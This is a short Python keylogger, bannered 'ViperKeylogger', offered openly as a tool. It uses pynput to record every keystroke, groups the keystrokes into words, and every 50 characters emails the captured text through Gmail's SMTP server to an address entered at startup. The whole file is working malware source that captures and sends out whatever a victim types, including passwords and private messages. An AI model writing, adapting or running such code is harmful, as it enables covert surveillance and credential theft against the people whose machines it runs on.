import getpass
import smtplib
from pynput.keyboard import Key, Listener

print('''
___    ______             ________                                             
__||  / /__(_)_______________  __ \                                            
__|| / /__  /___  __ \  _ \_  /_/ /                                            
__||/ / _  / __  /_/ /  __/  _, _/                                             
__|__/  /_/  _  .___/\___//_/ |_|                                              
             /_/                                                               
                 ______ __            ______                          ________ 
                 ___/ //_/_________  ____  /____________ _______ ________  __ \_
                 __/ ,<  _  _ \_  / / /_  /_  __ \_  __ `/_  __ `/  _ \_  /_/ /
                 _/ /| | /  __/  /_/ /_  / / /_/ /  /_/ /_  /_/ //  __/  _, _/ 
                 /_/ |_| \___/_\__, / /_/  \____/_\__, / _\__, / \___//_/ |_|  
                              /____/             /____/  /____/                           
''')

email = input('Enter Email to send Data')
password = getpass.getpass(prompt='App Password(Created in Google manage): ', stream=None)
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

full_log = ''
word = ''
char_limit = 50


def on_press(key):
    global word
    global full_log
    global char_limit
    global email
    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) >= char_limit:
            send_log()
            full_log = ''
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char

    if key == Key.esc:
        return False


def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )


with Listener(on_press=on_press) as listener:
    listener.join()
